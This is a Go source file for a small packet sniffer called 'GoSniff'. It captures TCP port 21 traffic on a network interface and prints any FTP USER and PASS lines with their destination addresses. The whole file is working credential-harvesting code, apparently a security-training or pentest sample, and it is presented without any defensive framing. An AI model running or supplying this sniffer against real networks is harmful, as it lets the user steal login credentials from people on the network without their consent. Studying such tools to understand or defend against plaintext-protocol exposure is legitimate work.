package main

import (
	"bytes"
	"fmt"
	"log"

	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
)

var (
	iface  = "bridge0"
	buffer = int32(1600)
	filter = "tcp and port 21"
)

func main() {
	fmt.Println("--= GoSniff =--")
	fmt.Println("A simple packet sniffer in golang")

	if !deviceExists(iface) {
		log.Fatal("Unable to open device ", iface)
	}

	handler, err := pcap.OpenLive(iface, buffer, false, pcap.BlockForever)

	if err != nil {
		log.Fatal(err)
	}
	defer handler.Close()

	if err := handler.SetBPFFilter(filter); err != nil {
		log.Fatal(err)
	}

	source := gopacket.NewPacketSource(handler, handler.LinkType())
	for packet := range source.Packets() {
		harvestFTPCreds(packet)
	}
}

func harvestFTPCreds(packet gopacket.Packet) {
	app := packet.ApplicationLayer()
	if app != nil {
		payload := app.Payload()
		dst := packet.NetworkLayer().NetworkFlow().Dst()
		if bytes.Contains(payload, []byte("USER")) {
			fmt.Print(dst, "  ->  ", string(payload))
		} else if bytes.Contains(payload, []byte("PASS")) {
			fmt.Print(dst, " -> ", string(payload))
		}
	}
}

func deviceExists(name string) bool {
	devices, err := pcap.FindAllDevs()

	if err != nil {
		log.Panic(err)
	}

	for _, device := range devices {
		if device.Name == name {
			return true
		}
	}
	return false
}
